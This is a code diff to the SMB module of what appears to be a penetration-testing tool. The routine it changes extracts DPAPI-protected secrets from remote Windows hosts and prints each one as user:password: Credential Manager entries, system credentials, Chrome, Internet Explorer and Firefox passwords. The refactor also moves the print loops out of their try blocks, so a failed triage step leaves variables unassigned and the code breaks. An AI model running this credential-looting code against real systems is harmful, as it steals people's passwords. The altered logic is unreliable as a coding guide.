@@ -1223,8 +1223,12 @@ class smb(connection):
             use_kcache=self.use_kcache,
         )
 
-        conn = DPLootSMBConnection(target) 
-        conn.smb_session = self.conn
+        try:
+            conn = DPLootSMBConnection(target) 
+            conn.smb_session = self.conn
+        except Exception as e:
+            self.logger.debug("Could not upgrade connection: {}".format(e))
+            return
 
         plaintexts = {username:password for _, _, username, password, _,_ in self.db.get_credentials(credtype="plaintext")}
         nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in self.db.get_credentials(credtype="hash")}
@@ -1251,41 +1255,44 @@ class smb(connection):
             # Collect User and Machine Credentials Manager secrets
             credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
             credentials = credentials_triage.triage_credentials()
-            for credential in credentials:
-                self.logger.highlight("[%s][CREDENTIAL] %s - %s:%s" % (credential.winuser, credential.target, credential.username, credential.password))
             system_credentials = credentials_triage.triage_system_credentials()
-            for credential in system_credentials:
-                self.logger.highlight("[SYSTEM][CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
         except Exception as e:
             self.logger.debug("Error while looting credentials: {}".format(e))
+        for credential in credentials:
+            self.logger.highlight("[%s][CREDENTIAL] %s - %s:%s" % (credential.winuser, credential.target, credential.username, credential.password))
+        for credential in system_credentials:
+            self.logger.highlight("[SYSTEM][CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+        
 
         try:
             # Collect Chrome Based Browser stored secrets
             browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
             browser_credentials, _ = browser_triage.triage_browsers()
-            for credential in browser_credentials:
-                self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
         except Exception as e:
             self.logger.debug("Error while looting browsers: {}".format(e))
-
+        for credential in browser_credentials:
+            self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+        
         try:
             # Collect User Internet Explorer stored secrets
             vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
             vaults = vaults_triage.triage_vaults()
-            for vault in vaults:
-                if vault.type == 'Internet Explorer':
-                    self.logger.highlight("[%s][IEX] %s - %s:%s" % (vault.winuser, vault.resource+' -' if vault.resource!= '' else '-', vault.username, vault.password))
         except Exception as e:
             self.logger.debug("Error while looting vaults: {}".format(e))
+        for vault in vaults:
+            if vault.type == 'Internet Explorer':
+                self.logger.highlight("[%s][IEX] %s - %s:%s" % (vault.winuser, vault.resource+' -' if vault.resource!= '' else '-', vault.username, vault.password))
+        
 
         try:
             # Collect Firefox stored secrets
             firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
             firefox_credentials = firefox_triage.run()
-            for credential in firefox_credentials:
-                self.logger.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
         except Exception as e:
             self.logger.debug("Error while looting firefox: {}".format(e))
+        for credential in firefox_credentials:
+            self.logger.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+        
 
     @requires_admin
     def lsa(self):
